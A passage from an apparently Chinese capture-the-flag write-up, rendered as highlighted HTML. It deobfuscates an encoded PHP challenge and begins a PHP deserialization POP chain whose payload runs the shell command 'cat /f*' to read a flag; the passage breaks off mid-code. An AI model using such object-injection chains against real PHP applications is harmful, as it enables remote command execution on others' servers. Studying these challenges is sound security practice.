variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">33</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$OO0O00</span><span class=\"token operator\">=</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">18</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token operator\">.</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$OO0000</span><span class=\"token operator\">=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">7</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">13</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O00O0O</span><span class=\"token operator\">.=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">22</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">36</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">29</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">26</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">32</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">35</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">26</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O00O0O</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"JE8wTzAwMD0iS1hwSnRScmdxVU9IY0Zld3lvUFNXbkNidmtmTUlkbXh6c0VMWVpCVkdoRE51YUFUbFFqaVRhTWh5UUpVclpudHFlS0JzTndSY2ttbG9kVkFTWXBXeGpMRWJJZkNndk9GdWl6RFBHWEh3TzlCaXR6VFNtelVTZ0NzcXA5c2EzaFBxZzlzWWdQdUlzVUJURGpUbUh6VVNtZlhsZ2V4cXNmeGlnZFRTbXpVU3RqVFNtelVTbXpVU21mQlljaGppY0FVaGc1UEt0RzdtSHpVU216VVNtelVxdENIbGdQWFNtUUJiYUZ4bkJOVVNtelVTbXpVU3RmMWJwV01ic2ZwWWM1WFlnUG9sSGZWYTNRb1ozUXNpYzVrVG1QN21IelVTbXpVU216VVNtelVTbVEwaWdQeEVENXVJYXYwblhNR0RlTk5odFFOaWFBeXdrZnZxM0FNbkJOVVNtelVTbXpVU3QwVFNtelVTdDBUU216VVNnRmpiYUZ4U3RZb21IelVTbWY3bUh6VVNtelVTbXpVcXRDSGxnUFhTbVF4SWFVN21IelVTbXpVU216VXF0Q0hsZ1BYU21RdkkyWjdtSHpVU216VVNtelVxdENIbGdQWFNtUU1sa1FQbGtRTWwyNDdtSHpVU216VVNtelVxdENIbGdQWFNnSTFscEYwaWM5dVNlOVZJZ0N4WXRoMWIzR05UYWpUU216VVNtelVTbXpVU216VUljRk5sc3pIUmdkVUN0aDVTdEZQcXBQdmxnUDZJUmZGSVJMSG5CTlVTbXpVU216VVNtelVTbXpkWWd2TXFzMCtpYzV4cWdDWFltVU1uQk5VU216VVNtelVTdDBUU216VVNtelVTbWZwWWM1WFlnUG9sSGZNbGtGQkljRjBUbVA3bUh6VVNtelVTbXpVU216VVNnUHBUbVEwaWdQeEVENXhJYVU5d1JZSGwzZGtoSGJkWWd2TXFzMCtiY1lQd0Qwa0ljUGtpdFFQSWM0a1RHTlVTbXpVU216VVNtelVTbWY3bUh6VVNtelVTbXpVU216VVNtelVTbWZQYjJ2b1NtUTBpZ1B4RUQ1TWxrUVBsa1FNbDI0N21IelVTbXpVU216VVNtelVTdDBUU216VVNtelVTbXpVU216VUljRk5sc3pIOGgrSXZETDQ1bFRmOGgrU2pIUzdtSHpVU216VVNtelVWR05VU216VVZHTlRTbXpVU2dGamJhRnhTTFFQbGM4VFNtelVTdGpUU216VVNtelVTbWZCWWNoamljQVVoZ0w3bUh6VVNtelVTbXpVcTNRdllnUFhTZ0kxbHBGMGljOXVTZTlWYjJlamxlRjBiYVFNYnNVZGJjRjBpYzl1RW16ZElnOE1tSHpVU216VVNtelVLQk5VU216VVNtelVTbXpVU21ma2xnOUhiY0JVaGdTN21IelVTbXpVU216VVNtelVTbVFIVG1RZGwxakJhUmQ3bUh6VVNtelVTbXpVVkdOVVNtelVWR05UU216VVNtUUhTTzBVaGU5R0QxRlpjc1lCYmFGeFkyOXNJbVlZbkJOVVNtelVoZ0xVd1J6ZGExZndaMVFsaDNDeElhaHViYzFQaDEwN21IelVTbWZ6WWM1eElhaE1iY1dNS3BaTmhnTE1uQk5VU216VWljYlVUbWVNcTNGUFltVWRiSGRNU3RqVFNtelVTbXpVU21mUGIydm9TbVM5d0QwOXdEMDl3RDA5d0QwOXdEMDl3RDFHRGVOVVJjNUJZYUdVY2M5MXFIZm5iYzFQU0QwOXdEMDl3RDA5d0QwOXdEMDl3RDA5d1JTN21IelVTbWY5bUh6VVNtZk1JSFVkYkQwOWgyZWRsY1B1aHNicGhnUzl3UlNraXhlcFljdjFoM0FVWWdDeFltZmRJYzFvU0hkVFNtelVTdGpUU216VVNtelVTbWZQYjJ2b1RtRWtwbG9Qb0lhcEhoT1BITThIVERqVFNtelVTdDBUbUh6VVNtei93VT09IjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>把上面代码的 <code>eval</code>  改成 eval，即可得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$O0O000</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"KXpJtRrgqUOHcFewyoPSWnCbvkfMIdmxzsELYZBVGhDNuaATlQjiTaMhyQJUrZntqeKBsNwRckmlodVASYpWxjLEbIfCgvOFuizDPGXHwO9BitzTSmzUSgCsqp9sa3hPqg9sYgPuIsUBTDjTmHzUSmfXlgexqsfxigdTSmzUStjTSmzUSmzUSmfBYchjicAUhg5PKtG7mHzUSmzUSmzUqtCHlgPXSmQBbaFxnBNUSmzUSmzUStf1bpWMbsfpYc5XYgPolHfVa3QoZ3Qsic5kTmP7mHzUSmzUSmzUSmzUSmQ0igPxED5uIav0nXMGDeNNhtQNiaAywkfvq3AMnBNUSmzUSmzUSt0TSmzUSt0TSmzUSgFjbaFxStYomHzUSmf7mHzUSmzUSmzUqtCHlgPXSmQxIaU7mHzUSmzUSmzUqtCHlgPXSmQvI2Z7mHzUSmzUSmzUqtCHlgPXSmQMlkQPlkQMl247mHzUSmzUSmzUqtCHlgPXSgI1lpF0ic9uSe9VIgCxYth1b3GNTajTSmzUSmzUSmzUSmzUIcFNlszHRgdUCth5StFPqpPvlgP6IRfFIRLHnBNUSmzUSmzUSmzUSmzdYgvMqs0+ic5xqgCXYmUMnBNUSmzUSmzUSt0TSmzUSmzUSmfpYc5XYgPolHfMlkFBIcF0TmP7mHzUSmzUSmzUSmzUSgPpTmQ0igPxED5xIaU9wRYHl3dkhHbdYgvMqs0+bcYPwD0kIcPkitQPIc4kTGNUSmzUSmzUSmzUSmf7mHzUSmzUSmzUSmzUSmzUSmfPb2voSmQ0igPxED5MlkQPlkQMl247mHzUSmzUSmzUSmzUSt0TSmzUSmzUSmzUSmzUIcFNlszH8h+IvDL45lTf8h+SjHS7mHzUSmzUSmzUVGNUSmzUVGNTSmzUSgFjbaFxSLQPlc8TSmzUStjTSmzUSmzUSmfBYchjicAUhgL7mHzUSmzUSmzUq3QvYgPXSgI1lpF0ic9uSe9Vb2ejleF0baQMbsUdbcF0ic9uEmzdIg8MmHzUSmzUSmzUKBNUSmzUSmzUSmzUSmfklg9HbcBUhgS7mHzUSmzUSmzUSmzUSmQHTmQdl1jBaRd7mHzUSmzUSmzUVGNUSmzUVGNTSmzUSmQHSO0Uhe9GD1FZcsYBbaFxY29sImYYnBNUSmzUhgLUwRzda1fwZ1Qlh3CxIahubc1Ph107mHzUSmfzYc5xIahMbcWMKpZNhgLMnBNUSmzUicbUTmeMq3FPYmUdbHdMStjTSmzUSmzUSmfPb2voSmS9wD09wD09wD09wD09wD09wD1GDeNURc5BYaGUcc91qHfnbc1PSD09wD09wD09wD09wD09wD09wRS7mHzUSmf9mHzUSmfMIHUdbD09h2edlcPuhsbphgS9wRSkixepYcv1h3AUYgCxYmfdIc1oSHdTSmzUStjTSmzUSmzUSmfPb2voTmEkploPoIapHhOPHM8HTDjTSmzUSt0TmHzUSmz/wU==\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'?>'</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00O0O</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>再次把 <code>eval</code>  改成  <code>echo</code> ，即可得到源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">shi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$next</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token class-name static-context\">next</span><span class=\"token operator\">::</span><span class=\"token function\">PLZ</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wo</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$sex</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hi Try serialize Me!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sex</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"🙅18岁🈲\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$do</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$do</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"==================PLZ Input Your Name!==================\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$b</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"'k1fuhu's test demo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登录成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>接下来是反序列化</p>\n<blockquote>\n<p>wo::__destruct =&gt; wo::inspect =&gt; shi::__toString =&gt; Demo:: __callStatic</p>\n</blockquote>\n<p>pop 链：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">shi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$next</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cat /f*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token class-name static-context\">next</span><span class=\"token operator\">::</span><span class=\"token function\">PLZ</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wo</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$sex</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hi Try serialize Me!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">inspect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sex</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'boy'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'eighteen'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"🙅18岁🈲\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$action</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$do</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$do</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">wo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">shi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">intention</span><span 